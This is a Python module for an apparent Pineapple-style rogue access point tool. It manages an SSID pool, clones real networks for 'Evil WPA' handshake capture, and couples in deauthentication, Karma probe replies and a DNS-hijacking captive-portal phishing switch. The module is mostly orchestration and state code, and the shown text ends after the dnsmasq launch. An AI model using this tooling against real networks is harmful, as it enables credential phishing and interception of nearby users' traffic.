"""PineAP — the rogue-AP engine.

The Hak5 Pineapple's headline feature. Owns:

* The **SSID pool** at ``$DATA_DIR/pineap_pool.json`` — a deduplicated
  set of SSIDs the platform has observed (recon scans, probe-request
  observations) or the operator has added manually. Pinned entries are
  protected from any future auto-eviction. Source-tagged so the UI can
  show why each entry was added.
* The **mode state** at ``$DATA_DIR/pineap_state.json`` — which radio
  the engine is bound to, what mode it's in, whether broadcast is
  enabled, whether capture is enabled, last-changed timestamp.

The Pineapple's three operation modes, faithful to the Hak5 semantics:

* ``passive`` — engine is configured but hostapd is not broadcasting.
  Use to stage settings without creating airspace noise. Default.
* ``active`` — broadcasting the pool as fake beacons. Every device in
  range sees the pool as available networks. Real attack surface
  starts here. (S11 lights this up; S10 only persists the choice.)
* ``advanced`` — ``active`` + Karma probe-response replies. Probe
  responses for *any* SSID a client asks for, not just pool entries.
  Most dangerous mode against saved open networks. (S11.)

Session 10 builds the singleton + pool/state CRUD + Settings tab + the
auto-population hooks. Hostapd lifecycle is stubbed: ``start()`` in
``passive`` mode just flips the state flag and emits a notification.
S11 will replace the stub with real hostapd-via-JobManager.

Singleton because the service holds live state (running mode,
in-flight job id once S11 lands). Same lesson hardened in
``crack.py`` / ``networking.py``.
"""

from __future__ import annotations

import json
import logging
import os
import re
import secrets
import signal
import threading
import time
from enum import Enum
from pathlib import Path
from typing import Any

log = logging.getLogger(__name__)


# ---------- S11 lifecycle constants ----------

DEFAULT_IFACE       = "wlan-ap"
DEFAULT_KARMA_IFACE = "wlan-mon-5g"
# Injection radio for the optional Evil WPA "deauth the real AP"
# (evil-twin) coupling. The third Alfa — free once recon is paused,
# which Evil WPA does on start. Despite the 2g label it's a dual-band
# mt76x2u, so it tunes the target's channel on either band.
DEFAULT_DEAUTH_IFACE = "wlan-mon-2g"
DEFAULT_CHANNEL     = 6
DEFAULT_HW_MODE     = "g"
DEFAULT_PRIMARY_SSID = "PineApple"     # operator should override before going live
DEFAULT_SUBNET      = "10.0.0.0/24"
DEFAULT_GATEWAY     = "10.0.0.1"
DEFAULT_DHCP_RANGE  = ("10.0.0.10", "10.0.0.250")

# Config + log files for the rogue AP. Living in /tmp keeps them
# tmpfs-fast and self-clearing on reboot — matching the same pattern
# we use for the management AP. The dnsmasq log is the tailer's input.
HOSTAPD_CONFIG_PATH  = Path("/tmp/pipineapple-pineap-hostapd.conf")
DNSMASQ_CONFIG_PATH  = Path("/tmp/pipineapple-pineap-dnsmasq.conf")
DNSMASQ_LOG_PATH     = Path("/tmp/pipineapple-pineap-dnsmasq.log")
DNSMASQ_LEASES_PATH  = Path("/tmp/pipineapple-pineap-dnsmasq.leases")
DNSMASQ_PID_PATH     = Path("/tmp/pipineapple-pineap-dnsmasq.pid")

# hostapd MAC-ACL files (S13 Filtering). One MAC per line; referenced by
# the rendered hostapd.conf via accept_mac_file / deny_mac_file.
ACCEPT_MAC_FILE      = Path("/tmp/pipineapple-pineap-accept-mac")
DENY_MAC_FILE        = Path("/tmp/pipineapple-pineap-deny-mac")


# ---------- Modes ----------

class PineAPMode(str, Enum):
    """str-enum so it round-trips through JSON without explicit
    encoding. Compare with ``PineAPMode.PASSIVE.value`` or by string
    equality (``state['mode'] == 'passive'``)."""
    OFF      = "off"          # Engine not configured / hostapd not running
    PASSIVE  = "passive"      # Configured but not broadcasting (S10 limit)
    ACTIVE   = "active"       # Broadcasting pool as fake beacons (S11)
    ADVANCED = "advanced"     # Active + Karma probe responses (S11)

    @classmethod
    def from_str(cls, s: str) -> "PineAPMode | None":
        try:
            return cls(s.lower().strip())
        except (AttributeError, ValueError):
            return None


# Sources we tag SSIDs with — informational only, but useful for
# operator review ("why is this in my pool?").
SOURCE_RECON  = "recon"      # Auto-added from a recon scan beacon
SOURCE_PROBE  = "probe"      # Auto-added from a client probe request
SOURCE_MANUAL = "manual"     # Operator typed it in
SOURCE_IMPORT = "import"     # Reserved for S13 import-from-file

# 802.11 caps SSIDs at 32 bytes (UTF-8). hostapd accepts up to 32 chars
# in its plaintext form; longer SSIDs require utf8_ssid=1 + hex
# encoding. We validate length in bytes (not codepoints) for spec
# compliance.
MAX_SSID_BYTES = 32

# Conservative character set for the manual-add path — printable ASCII
# plus space + a few common safe symbols. Auto-population sources
# (recon/probe) bypass this and only get the length check, because
# real-world SSIDs include emoji, CJK, etc. and we shouldn't drop
# them silently.
_MANUAL_SSID_RE = re.compile(r"^[\x20-\x7e]{1,32}$")


# ---------- Service ----------

class PineAPService:
    def __init__(self, data_dir: Path) -> None:
        self._data_dir   = data_dir
        self._pool_path  = data_dir / "pineap_pool.json"
        self._state_path = data_dir / "pineap_state.json"
        self._lock = threading.Lock()
        # Lazy load — the factory creates the singleton during
        # _attach_services, before all config is settled. First call
        # to any public method triggers _load().
        self._state: dict[str, Any] | None = None
        self._pool:  list[dict[str, Any]] | None = None
        # When True, _start_broadcast renders the rogue dnsmasq with the
        # captive-portal DNS hijack from the start (avoids a fragile
        # mid-flight restart that breaks DHCP). Set by the direct-portal
        # launch around start().
        self._pending_dns_hijack = False
        # Impersonation SSID-rotation thread (S13)
        self._impersonation_thread: threading.Thread | None = None
        self._impersonation_stop = threading.Event()
        # Standalone broadcast-deauth loop for the *direct* open-portal
        # path (the WPA2 capture flow has its own deauth in evil_wpa).
        self._direct_deauth_thread: threading.Thread | None = None
        self._direct_deauth_stop = threading.Event()

    # ---------- Persistence ----------
    def _load(self) -> None:
        # Caller holds self._lock.
        if self._state is None:
            try:
                loaded = json.loads(self._state_path.read_text())
            except (FileNotFoundError, json.JSONDecodeError):
                loaded = {}
            # Merge defaults so older state files (e.g. S10 vintage,
            # missing the S11 lifecycle fields) get the new keys
            # populated rather than KeyError'ing later. Loaded values
            # always win for keys that exist on both sides.
            defaults = self._default_state()
            defaults.update(loaded)
            self._state = defaults
        if self._pool is None:
            try:
                data = json.loads(self._pool_path.read_text())
                self._pool = list(data.get("ssids") or [])
            except (FileNotFoundError, json.JSONDecodeError):
                self._pool = []

    def _default_state(self) -> dict[str, Any]:
        return {
            "mode":              PineAPMode.OFF.value,
            "broadcast_enabled": False,
            "capture_enabled":   False,
            "iface":             DEFAULT_IFACE,
            "karma_iface":       DEFAULT_KARMA_IFACE,
            "deauth_iface":      DEFAULT_DEAUTH_IFACE,
            "primary_ssid":      DEFAULT_PRIMARY_SSID,
            "primary_hidden":    False,    # ignore_broadcast_ssid for the primary BSS
            "channel":           DEFAULT_CHANNEL,
            "hw_mode":           DEFAULT_HW_MODE,
            "subnet":            DEFAULT_SUBNET,
            "gateway_ip":        DEFAULT_GATEWAY,
            "dhcp_range":        list(DEFAULT_DHCP_RANGE),
            # Salt for deterministic per-SSID BSSID generation. Auto-
            # generated on first save so the operator never has to
            # think about it. Stable across reboots, different across
            # deployments — see hostapd.bssid_for_ssid().
            "bssid_salt":        secrets.token_hex(16),
            # ---- Security mode (S12) ----
            # "open" (Open SSID tab) or "wpa2" (Evil WPA tab). The
            # engine is the same hostapd instance either way; this
            # just controls whether wpa=2 lines get rendered in the
            # config and whether we generate a random PSK at start.
            "security_mode":     "open",
            # Last generated rogue PSK (for operator visibility — the
            # value doesn't matter functionally since clients fail at
            # M3 with our random PSK, but operators want to know what
            # the engine set). Regenerated on every wpa2 Start.
            "last_rogue_psk":    None,
            # Evil WPA clone target metadata — populated by
            # clone_evil_wpa_target() when operator clicks "Clone to
            # PineAP" on a Recon AP slide-out. Lets the UI show
            # "cloning HomeNet (real BSSID a4:c1:38:...) → rogue BSSID
            # 82:5f:..." so the operator can tell them apart on the
            # Handshakes page.
            "evil_wpa_target":   None,
            "last_changed":      time.time(),
            "running":           False,    # True only while hostapd is up
            # JobManager IDs for the running daemons — used by stop()
            # to SIGTERM each one. Cleared on stop.
            "hostapd_job_id":    None,
            "dnsmasq_job_id":    None,
            # Karma + sentinel running flags (services manage their own
            # lifecycle; we just track for the UI status pill)
            "karma_running":     False,
            "sentinel_running":  False,
            # ---- Filtering (S13) ----
            # Client MAC ACL: "off" (accept all), "allow" (only these),
            # "deny" (everyone but these) → hostapd macaddr_acl. SSID
            # filter gates which pool SSIDs the broadcast/impersonation
            # rotation is allowed to advertise. Both apply on next Start.
            "client_filter_mode": "off",
            "client_filter_macs": [],
            "ssid_filter_mode":   "off",
            "ssid_filter_ssids":  [],
            # ---- Impersonation (S13) ----
            # SSID rotation on the single BSS (mt76x2u multi-BSS cap is 1):
            # cycle the broadcast SSID through the pool every dwell via
            # hostapd_cli reload. bssid strategy: per-ssid (deterministic,
            # default) | shared | random.
            "impersonate_enabled":        False,
            "impersonate_dwell_secs":     20,
            "impersonate_bssid_strategy": "per-ssid",
            "impersonate_running":        False,
            "impersonate_current_ssid":   None,
            # Whether recon was scanning when we paused it to claim the
            # monitor radio. Captured at start so teardown only *restores*
            # recon if it was actually running before — otherwise stopping
            # the rogue AP would spuriously start a scan the operator never
            # asked for.
            "recon_was_running": False,
            # Evil WPA EAPOL sniffer running flag (S12)
            "evil_wpa_running":  False,
            # Captive-portal phishing bait-switch (S12.5). Per-start
            # option: when True (and the global captive-portal opt-in is
            # on in Settings → Security), the first harvested partial
            # auto-flips the rogue from WPA2 to an Open clone of the same
            # SSID and arms the captive portal against that handshake.
            "auto_captive_portal": False,
            # Runtime flag — True while the portal is live post-flip.
            "captive_portal_active": False,
            # Runtime flag — True while the direct open-portal path's
            # standalone broadcast-deauth loop is running.
            "direct_deauth_running": False,
            # Whether the rogue dnsmasq is currently in DNS-hijack mode
            # (captive portal). Tracked so the bait-switch knows it doesn't
            # need a mid-flight dnsmasq restart.
            "dnsmasq_hijacked": False,
            # Optional "evil-twin" deauth coupling (S12): when True AND a
            # real target BSSID is known (i.e. cloned from Recon), Start
            # also fires broadcast deauth at the real AP on the spare
            # radio to force its clients to re-associate — some land on
            # our clone and hand us M1+M2. Default off, opt-in, lab-only.
            # No-op against MFP-required (802.11w) targets.
            "evil_wpa_deauth":   False,
        }

    def _save_state(self) -> None:
        # Caller holds self._lock.
        self._state_path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._state_path.with_suffix(".tmp")
        tmp.write_text(json.dumps(self._state, indent=2))
        tmp.replace(self._state_path)

    def _save_pool(self) -> None:
        # Caller holds self._lock.
        self._pool_path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._pool_path.with_suffix(".tmp")
        tmp.write_text(json.dumps({"ssids": self._pool}, indent=2))
        tmp.replace(self._pool_path)

    # ---------- Public: state / mode ----------
    def get_state(self) -> dict[str, Any]:
        with self._lock:
            self._load()
            # Returning a copy so callers can't mutate our internal state
            return dict(self._state)  # type: ignore[arg-type]

    def set_mode(self, mode: str) -> tuple[bool, str]:
        m = PineAPMode.from_str(mode)
        if m is None:
            return False, f"unknown mode {mode!r} (expected off/passive/active/advanced)"
        with self._lock:
            self._load()
            if self._state["mode"] == m.value:
                return True, f"mode already {m.value}"
            # S10 limit: we can persist any mode but starting hostapd
            # in active/advanced isn't wired yet. Allow set_mode so
            # the operator can stage state; start() will reject
            # active/advanced until S11.
            old = self._state["mode"]
            self._state["mode"] = m.value
            self._state["last_changed"] = time.time()
            self._save_state()
        log.info("pineap mode: %s -> %s", old, m.value)
        return True, f"mode set to {m.value}"

    def set_broadcast(self, enabled: bool) -> tuple[bool, str]:
        with self._lock:
            self._load()
            self._state["broadcast_enabled"] = bool(enabled)
            self._state["last_changed"] = time.time()
            self._save_state()
        return True, f"broadcast {'enabled' if enabled else 'disabled'}"

    def set_capture(self, enabled: bool) -> tuple[bool, str]:
        with self._lock:
            self._load()
            self._state["capture_enabled"] = bool(enabled)
            self._state["last_changed"] = time.time()
            self._save_state()
        return True, f"capture {'enabled' if enabled else 'disabled'}"

    def set_ap_config(
        self,
        primary_ssid: str | None = None,
        channel: int | None = None,
        primary_hidden: bool | None = None,
        hw_mode: str | None = None,
        security_mode: str | None = None,
        evil_wpa_deauth: bool | None = None,
        auto_captive_portal: bool | None = None,
    ) -> tuple[bool, str]:
        """Update the rogue AP config (primary SSID + channel + hidden +
        band + security mode). Refuses while PineAP is running —
        operator must stop first, change config, restart. (Changing
        channel under a live hostapd would disconnect every client
        anyway.)

        ``security_mode`` is "open" (Open SSID tab path) or "wpa2"
        (Evil WPA tab path). When set to "wpa2" the engine will
        generate a fresh random PSK on every Start (logged in the
        notification drawer) — clients fail at M3 with our random
        PSK, but by then we've collected the M1+M2 partial.
        """
        with self._lock:
            self._load()
            if self._state["running"]:
                return False, "stop PineAP before changing AP config"
            if primary_ssid is not None:
                p = primary_ssid.strip()
                if not p or len(p.encode("utf-8")) > MAX_SSID_BYTES:
                    return False, "primary SSID must be 1-32 bytes UTF-8"
                self._state["primary_ssid"] = p
            if channel is not None:
                try:
                    ch = int(channel)
                except (TypeError, ValueError):
                    return False, "channel must be an int"
                if not (1 <= ch <= 196):
                    return False, f"channel {ch} out of valid range"
                self._state["channel"] = ch
            if primary_hidden is not None:
                self._state["primary_hidden"] = bool(primary_hidden)
            if hw_mode is not None:
                if hw_mode not in ("g", "a"):
                    return False, f"hw_mode must be 'g' or 'a', got {hw_mode!r}"
                self._state["hw_mode"] = hw_mode
            if security_mode is not None:
                if security_mode not in ("open", "wpa2"):
                    return False, f"security_mode must be 'open' or 'wpa2', got {security_mode!r}"
                # Changing away from wpa2 also clears the cloned-target
                # metadata so the UI doesn't show stale "cloning from..."
                # banners after the operator manually switches to open.
                if security_mode == "open" and self._state.get("security_mode") == "wpa2":
                    self._state["evil_wpa_target"] = None
                    # Switching back to open also disarms the evil-twin
                    # deauth coupling + captive-portal bait-switch (both
                    # only make sense for a WPA clone).
                    self._state["evil_wpa_deauth"] = False
                    self._state["auto_captive_portal"] = False
                self._state["security_mode"] = security_mode
            if evil_wpa_deauth is not None:
                self._state["evil_wpa_deauth"] = bool(evil_wpa_deauth)
            if auto_captive_portal is not None:
                self._state["auto_captive_portal"] = bool(auto_captive_portal)
            self._state["last_changed"] = time.time()
            self._save_state()
        return True, "AP config updated"

    def clone_evil_wpa_target(
        self,
        bssid: str,
        essid: str,
        channel: int,
        *,
        source_signal_dbm: int | None = None,
        source_security: str | None = None,
        source_mfp_required: bool | None = None,
    ) -> tuple[bool, str]:
        """Set up Evil WPA cloning from a Recon-observed AP. One-click
        from the Recon AP slide-out. Configures primary_ssid + channel
        + security_mode=wpa2 in one shot, plus records the source AP's
        metadata so the operator can correlate captured handshakes
        back to the real target on the Handshakes page.

        Refuses while PineAP is running."""
        bssid = (bssid or "").strip().lower()
        essid = (essid or "").strip()
        if not bssid or not essid:
            return False, "bssid and essid are required"
        try:
            ch = int(channel)
        except (TypeError, ValueError):
            return False, "channel must be an int"
        if not (1 <= ch <= 196):
            return False, f"channel {ch} out of valid range"
        if len(essid.encode("utf-8")) > MAX_SSID_BYTES:
            return False, f"essid exceeds {MAX_SSID_BYTES} bytes"
        # Channel selection determines hw_mode: 2.4GHz = 'g', 5GHz = 'a'.
        # mt76 cards on this hardware support both bands; the 'g' for
        # 5GHz check is fine because hostapd will refuse channels that
        # don't match the mode.
        hw_mode = "a" if ch >= 36 else "g"

        with self._lock:
            self._load()
            if self._state["running"]:
                return False, "stop PineAP before cloning a new target"
            self._state["primary_ssid"]   = essid
            self._state["channel"]        = ch
            self._state["hw_mode"]        = hw_mode
            self._state["security_mode"]  = "wpa2"
            self._state["primary_hidden"] = False
            self._state["evil_wpa_target"] = {
                "source_bssid":        bssid,
                "source_essid":        essid,
                "source_channel":      ch,
                "source_signal_dbm":   source_signal_dbm,
                "source_security":     source_security,
                # 802.11w state of the real AP. When True, the evil-twin
                # deauth coupling can't dislodge clients (frames rejected)
                # — the UI warns and the operator can still opt in, but it
                # will be a no-op. None = unknown (older recon detail).
                "source_mfp_required": bool(source_mfp_required) if source_mfp_required is not None else None,
                "cloned_at":           time.time(),
            }
            # Each fresh clone starts with the deauth coupling disarmed —
            # it's an explicit opt-in per target.
            self._state["evil_wpa_deauth"] = False
            self._state["last_changed"] = time.time()
            self._save_state()
        log.info("pineap: cloned Evil WPA target %r (BSSID %s, ch%d, sig=%s)",
                 essid, bssid, ch, source_signal_dbm)
        return True, f"cloned {essid!r} (real BSSID {bssid}, ch{ch}) — ready to Start"

    # ---------- Public: Filtering (S13) ----------
    _FILTER_MODES = ("off", "allow", "deny")

    def set_filters(
        self,
        *,
        client_mode: str | None = None,
        client_macs: list[str] | None = None,
        ssid_mode: str | None = None,
        ssid_ssids: list[str] | None = None,
    ) -> tuple[bool, str]:
        """Update the client-MAC and/or SSID allow/deny filters. Lists,
        when given, replace the stored ones wholesale (the UI owns
        add/remove). Changes persist and take effect on the next Start —
        we don't hot-reload hostapd's ACL mid-session on this driver."""
        with self._lock:
            self._load()
            if client_mode is not None:
                if client_mode not in self._FILTER_MODES:
                    return False, f"client_mode must be one of {self._FILTER_MODES}"
                self._state["client_filter_mode"] = client_mode
            if client_macs is not None:
                cleaned = []
                for m in client_macs:
                    m = (m or "").strip().lower()
                    if re.match(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$", m):
                        if m not in cleaned:
                            cleaned.append(m)
                    elif m:
                        return False, f"invalid MAC {m!r}"
                self._state["client_filter_macs"] = cleaned
            if ssid_mode is not None:
                if ssid_mode not in self._FILTER_MODES:
                    return False, f"ssid_mode must be one of {self._FILTER_MODES}"
                self._state["ssid_filter_mode"] = ssid_mode
            if ssid_ssids is not None:
                self._state["ssid_filter_ssids"] = [
                    s for s in (x.strip() for x in ssid_ssids) if s]
            self._state["last_changed"] = time.time()
            self._save_state()
        return True, "filters updated (apply on next Start)"

    def _ssid_allowed(self, ssid: str, snap: dict[str, Any]) -> bool:
        """Apply the SSID allow/deny filter to a single SSID."""
        mode = snap.get("ssid_filter_mode", "off")
        lst = snap.get("ssid_filter_ssids") or []
        if mode == "allow":
            return ssid in lst
        if mode == "deny":
            return ssid not in lst
        return True

    def _write_mac_acl(self, snap: dict[str, Any]) -> dict[str, Any]:
        """Materialise the client MAC ACL files from the filter config and
        return the kwargs to hand hostapd.render_config. ``off`` → no ACL
        lines (accept all)."""
        from app.tools._common import stub_mode
        mode = snap.get("client_filter_mode", "off")
        macs = snap.get("client_filter_macs") or []
        if mode == "off" or not macs:
            return {}
        path = ACCEPT_MAC_FILE if mode == "allow" else DENY_MAC_FILE
        body = "\n".join(macs) + "\n"
        if stub_mode():
            Path(f"/tmp/pipineapple-pineap-{mode}-mac.preview").write_text(body)
        else:
            try:
                path.write_text(body)
            except OSError:
                log.exception("pineap: writing MAC ACL file failed")
                return {}
        if mode == "allow":
            return {"macaddr_acl": 1, "accept_mac_file": str(path)}
        return {"macaddr_acl": 0, "deny_mac_file": str(path)}

    # ---------- Public: Impersonation (S13) ----------
    def set_impersonation(
        self, *, enabled: bool | None = None, dwell_secs: int | None = None,
        bssid_strategy: str | None = None,
    ) -> tuple[bool, str]:
        """Configure the SSID-rotation impersonation. Refuses while
        running (rotation params are read at Start)."""
        with self._lock:
            self._load()
            if self._state["running"]:
                return False, "stop PineAP before changing impersonation config"
            if enabled is not None:
                self._state["impersonate_enabled"] = bool(enabled)
            if dwell_secs is not None:
                try:
                    d = int(dwell_secs)
                except (TypeError, ValueError):
                    return False, "dwell_secs must be an int"
                if not (2 <= d <= 3600):
                    return False, "dwell_secs out of range (2-3600)"
                self._state["impersonate_dwell_secs"] = d
            if bssid_strategy is not None:
                if bssid_strategy not in ("per-ssid", "shared", "random"):
                    return False, "bssid_strategy must be per-ssid|shared|random"
                self._state["impersonate_bssid_strategy"] = bssid_strategy
            self._state["last_changed"] = time.time()
            self._save_state()
        return True, "impersonation config updated"

    # ---------- Public: SSID pool ----------
    def list_pool(self) -> list[dict[str, Any]]:
        """Return all pool entries, pinned first, then newest-last_seen."""
        with self._lock:
            self._load()
            entries = [dict(e) for e in (self._pool or [])]
        entries.sort(
            key=lambda e: (not e.get("pinned", False),
                           -(e.get("last_seen") or 0)),
        )
        return entries

    def add_ssid(
        self, ssid: str, source: str = SOURCE_MANUAL,
        *, pin: bool = False,
    ) -> tuple[bool, str]:
        """Add or refresh an SSID in the pool. Idempotent — existing
        entries get their ``last_seen`` and ``observed_count`` bumped
        rather than duplicated. Validation depth depends on source:
        ``manual`` requires printable ASCII; auto-sources only enforce
        length so real-world non-ASCII SSIDs pass through."""
        ssid = ssid if ssid is not None else ""

        # Length: 802.11 caps at 32 bytes UTF-8
        if not ssid:
            return False, "empty SSID"
        ssid_bytes = ssid.encode("utf-8", errors="replace")
        if len(ssid_bytes) > MAX_SSID_BYTES:
            return False, f"SSID exceeds {MAX_SSID_BYTES} bytes"

        # Manual-add validation: printable ASCII only. Auto-sources
        # bypass — we'd rather store an emoji-laced SSID than silently
        # drop a real-world target.
        if source == SOURCE_MANUAL and not _MANUAL_SSID_RE.match(ssid):
            return False, "manual SSIDs must be 1-32 printable ASCII chars"

        now = time.time()
        with self._lock:
            self._load()
            assert self._pool is not None
            # Case-sensitive match — SSIDs ARE case-sensitive per spec
            existing = next((e for e in self._pool if e.get("ssid") == ssid), None)
            if existing:
                existing["last_seen"]      = now
                existing["observed_count"] = (existing.get("observed_count") or 0) + 1
                if pin:
                    existing["pinned"] = True
                # If the existing entry was auto-collected and operator
                # is now manually adding, promote the source so the UI
                # shows it as operator-curated.
                if source == SOURCE_MANUAL and existing.get("source") != SOURCE_MANUAL:
                    existing["source"] = SOURCE_MANUAL
                self._save_pool()
                return True, f"refreshed {ssid!r}"
            # New entry
            self._pool.append({
                "ssid":           ssid,
                "source":         source,
                "first_seen":     now,
                "last_seen":      now,
                "observed_count": 1,
                "pinned":         pin,
                "hidden":         False,    # operator can mark to suppress from broadcast
            })
            self._save_pool()
        log.info("pineap pool +%s (%s)", ssid, source)
        return True, f"added {ssid!r}"

    def remove_ssid(self, ssid: str) -> tuple[bool, str]:
        with self._lock:
            self._load()
            assert self._pool is not None
            new_pool = [e for e in self._pool if e.get("ssid") != ssid]
            if len(new_pool) == len(self._pool):
                return False, f"SSID {ssid!r} not in pool"
            self._pool = new_pool
            self._save_pool()
        return True, f"removed {ssid!r}"

    def set_pinned(self, ssid: str, pinned: bool) -> tuple[bool, str]:
        with self._lock:
            self._load()
            assert self._pool is not None
            for e in self._pool:
                if e.get("ssid") == ssid:
                    e["pinned"] = bool(pinned)
                    self._save_pool()
                    return True, f"{ssid!r} {'pinned' if pinned else 'unpinned'}"
        return False, f"SSID {ssid!r} not in pool"

    def set_hidden(self, ssid: str, hidden: bool) -> tuple[bool, str]:
        """Mark an entry to be excluded from broadcast without removing
        it. Useful for "in pool but not advertising right now" without
        losing the auto-collected timestamps."""
        with self._lock:
            self._load()
            assert self._pool is not None
            for e in self._pool:
                if e.get("ssid") == ssid:
                    e["hidden"] = bool(hidden)
                    self._save_pool()
                    return True, f"{ssid!r} {'hidden' if hidden else 'visible'}"
        return False, f"SSID {ssid!r} not in pool"

    def clear_pool(self, *, include_pinned: bool = False) -> tuple[bool, str, int]:
        """Drop all entries. By default pinned entries survive; pass
        ``include_pinned=True`` to nuke everything."""
        with self._lock:
            self._load()
            assert self._pool is not None
            before = len(self._pool)
            if include_pinned:
                self._pool = []
            else:
                self._pool = [e for e in self._pool if e.get("pinned")]
            removed = before - len(self._pool)
            self._save_pool()
        return True, f"cleared {removed} entries", removed

    # ---------- Public: full lifecycle (S11) ----------
    def start(self) -> tuple[bool, list[str]]:
        """Bring up PineAP per the current mode.

        passive  → just flips the running flag (operator wants the
                   engine "armed but silent" — useful staging area).
        active   → bring up wlan-ap → render+launch dnsmasq →
                   render+launch hostapd → start captive sentinel +
                   client-recon log tailer → push the rogue subnet
                   into the management-access deny-list.
        advanced → everything in active, plus pause recon on the
                   karma radio + start the Scapy karma injector.

        Idempotent: re-calling start while already running returns
        a "no-op" success.
        """
        msgs: list[str] = []
        with self._lock:
            self._load()
            mode = self._state["mode"]
            if mode == PineAPMode.OFF.value:
                return False, ["mode is 'off' — pick a mode before starting"]
            if self._state["running"]:
                return True, [f"already running in {mode} mode"]

            # Take a snapshot of the config fields under the lock; the
            # rest of start() runs outside it so the long blocking
            # operations (subprocess waits, network setup) don't hold
            # the lock and block other request handlers.
            snap = dict(self._state)
            pool_snap = list(self._pool or [])

        if mode == PineAPMode.PASSIVE.value:
            with self._lock:
                self._state["running"]      = True
                self._state["last_changed"] = time.time()
                self._save_state()
            msgs.append("started in passive mode (configured, hostapd silent)")
            log.info("pineap: %s", msgs[-1])
            return True, msgs

        # Active or Advanced path
        ok, sub_msgs = self._start_broadcast(snap, pool_snap,
                                             advanced=(mode == PineAPMode.ADVANCED.value))
        msgs.extend(sub_msgs)
        if not ok:
            # Try to undo whatever did come up so we don't leak state
            log.warning("pineap: start failed mid-way, attempting rollback")
            self._tear_down_broadcast()
            return False, msgs

        with self._lock:
            self._state["running"]      = True
            self._state["last_changed"] = time.time()
            self._save_state()
        return True, msgs

    def stop(self) -> tuple[bool, list[str]]:
        msgs: list[str] = []
        with self._lock:
            self._load()
            if not self._state.get("running"):
                return True, ["already stopped"]
            mode = self._state["mode"]
            running_broadcast = mode in (PineAPMode.ACTIVE.value,
                                         PineAPMode.ADVANCED.value)

        if running_broadcast:
            msgs.extend(self._tear_down_broadcast())

        with self._lock:
            self._state["running"]            = False
            self._state["hostapd_job_id"]     = None
            self._state["dnsmasq_job_id"]     = None
            self._state["karma_running"]      = False
            self._state["evil_wpa_running"]   = False
            self._state["sentinel_running"]   = False
            self._state["captive_portal_active"] = False
            self._state["dnsmasq_hijacked"]      = False
            self._state["impersonate_running"]   = False
            self._state["impersonate_current_ssid"] = None
            self._state["last_changed"]       = time.time()
            self._save_state()
        msgs.append("stopped")
        log.info("pineap: stopped (mode was %s)",
                 self._state.get("mode", "?"))
        return True, msgs

    # ---------- Internal lifecycle steps ----------
    def _start_broadcast(
        self, snap: dict[str, Any], pool: list[dict[str, Any]],
        *, advanced: bool,
    ) -> tuple[bool, list[str]]:
        """Bring up the AP stack: interface → dnsmasq → hostapd → sentinel
        → (karma if advanced). Each step that succeeds records its state
        so _tear_down_broadcast can undo it. Returns (ok, messages)."""
        from app.tools import hostapd as hostapd_tool
        from app.tools import dnsmasq as dnsmasq_tool
        from app.tools import iproute, rfkill, nm
        from app.tools._common import stub_mode
        from app.services.job_manager import job_manager
        from app.services.access_control import access_control

        msgs: list[str] = []
        iface       = snap["iface"]
        primary_ssid = snap["primary_ssid"]
        channel     = int(snap["channel"])
        hw_mode     = snap["hw_mode"]
        gateway     = snap["gateway_ip"]
        subnet      = snap["subnet"]
        dhcp_start, dhcp_end = snap["dhcp_range"]
        salt        = snap["bssid_salt"]

        # ---- 1. Interface bring-up ----
        rfkill.unblock_wifi()
        ok, msg = nm.set_managed(iface, False)
        msgs.append(f"nm.unmanage({iface}): {msg}")
        if not ok and not stub_mode():
            # nmcli failures aren't fatal — the iface may already be
            # unmanaged or NM may not be running. Continue.
            log.warning("pineap: nm.set_managed soft-failure: %s", msg)
        # Ensure the interface is in 'managed' type before hostapd takes
        # over. The mt76 driver fails to switch monitor → AP directly
        # ("could not configure driver mode"); the reliable sequence is
        # monitor → managed (us) → AP (hostapd). The kernel refuses
        # `iw set type` while the interface is administratively up
        # ("Device or resource busy") — so we must bring it down first,
        # change type, then bring it back up. If it was already managed
        # and down, this is essentially a no-op.
        iproute.set_link_state(iface, "down")
        try:
            from app.tools import iw
            ok, msg = iw.set_type(iface, "managed")
            msgs.append(f"iw set type managed {iface}: {msg}")
        except Exception as e:
            log.warning("pineap: iw.set_type soft-failure on %s: %s", iface, e)
        # Flush in case a stale address from a previous run lingers
        iproute.flush_address(iface)
        ok, msg = iproute.add_address(iface, f"{gateway}/24")
        msgs.append(f"ip addr add {gateway}/24 dev {iface}: {msg}")
        if not ok and not stub_mode():
            return False, msgs
        ok, msg = iproute.set_link_state(iface, "up")
        msgs.append(f"ip link up {iface}: {msg}")
        if not ok and not stub_mode():
            return False, msgs

        # ---- 2. dnsmasq config + launch ----
        # Hijack DNS from the start when this run is captive-portal-bound
        # (direct launch, or Evil WPA with auto-captive-portal armed) —
        # during WPA capture clients never complete association so DNS is
        # unused anyway, and starting hijacked avoids a mid-flight dnsmasq
        # restart that breaks DHCP. Otherwise forward (clients get real
        # internet).
        want_hijack = self._pending_dns_hijack
        if not want_hijack and snap.get("auto_captive_portal"):
            try:
                from app.services.captive_portal import get_service as get_cp
                want_hijack = get_cp().is_enabled()
            except Exception:
                pass
        dnsmasq_body = self._render_dnsmasq_body(snap, hijack=want_hijack)
        if want_hijack:
            msgs.append("dnsmasq: DNS-hijack on (captive-portal mode)")
        with self._lock:
            self._state["dnsmasq_hijacked"] = want_hijack
            self._save_state()
        dnsmasq_tool.write_config(DNSMASQ_CONFIG_PATH, dnsmasq_body)
        # Remove any stale log file from a previous run. We used to
        # truncate via Python's write_text(""), but that leaves the
        # file owned by root — and dnsmasq drops privileges to nobody
        # right after startup, then can't open the root-owned file for
        # writing ("Permission denied" → dnsmasq aborts). Unlink lets
        # dnsmasq create a fresh file as its own user every Start. The
        # tailer waits for the file to (re)appear (see client_recon
        # _tail_loop file-not-exists branch) and seeks to start to
        # catch every line.
        try:
            DNSMASQ_LOG_PATH.unlink()
        except FileNotFoundError:
            pass
        except OSError as e:
            log.warning("pineap: could not unlink stale dnsmasq log: %s", e)

        dnsmasq_cmd = [
            "dnsmasq", "--keep-in-foreground",
            "-C", str(DNSMASQ_CONFIG_PATH),
        ]
        try:
            dns_job = job_manager.start_job(
                dnsmasq_cmd, name="pineap-dnsmasq", tags=["pineap"],
            )
            with self._lock:
                self._state["dnsmasq_job_id"] = dns_job.id
            msgs.append(f"dnsmasq started (job {dns_job.id})")
        except Exception as e:
            log.exception("pineap: dnsmasq launch failed")
            return False, msgs + [f"dnsmasq launch failed: {e}"]

